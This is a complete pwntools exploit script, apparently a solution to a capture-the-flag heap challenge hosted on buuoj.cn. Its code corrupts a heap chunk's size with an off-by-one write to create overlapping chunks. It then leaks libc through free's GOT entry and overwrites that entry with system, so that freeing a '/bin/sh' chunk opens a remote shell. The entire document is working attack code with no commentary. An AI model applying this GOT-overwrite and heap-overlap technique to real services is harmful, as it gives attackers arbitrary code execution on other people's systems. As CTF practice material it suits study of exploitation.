from pwn import *

sh=remote("node5.buuoj.cn",26763)
libc=ELF("./libc-2.27.so")
elf=ELF("./timu")

def alloc(size, content):
	sh.sendlineafter("Your choice :",'1')
	sh.sendlineafter("only) : ",str(size))
	sh.sendlineafter("Content:",content)

def edit(idx, content):
	sh.sendlineafter("Your choice :",'2')
	sh.sendlineafter("Index :",str(idx))
	sh.recvuntil("Content: ")
	sh.send(content)

def show(idx):
	sh.sendlineafter("Your choice :",'3')
	sh.sendlineafter("Index :",str(idx))

def free(idx):
	sh.sendlineafter("Your choice :",'4')
	sh.sendlineafter("Index :",str(idx))

free_got=elf.got["free"]

alloc(0x18,b'aaaa') #1
alloc(0x18,b'aaaa') #2

payload=b"/bin/sh\x00"+0x10*b'a'+b"\x41"
edit(0,payload)
free(1)

payload=0x10*b'a'+p64(0x40)+p64(0x21)+p64(0x38)+p64(free_got)
alloc(0x38,payload)
show(1)
free_addr = u64(sh.recvuntil(b"\x7f")[-6:]+b'\x00\x00')
libc_base=free_addr-libc.sym["free"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]

edit(1,p64(system_addr))
free(0)

sh.interactive()
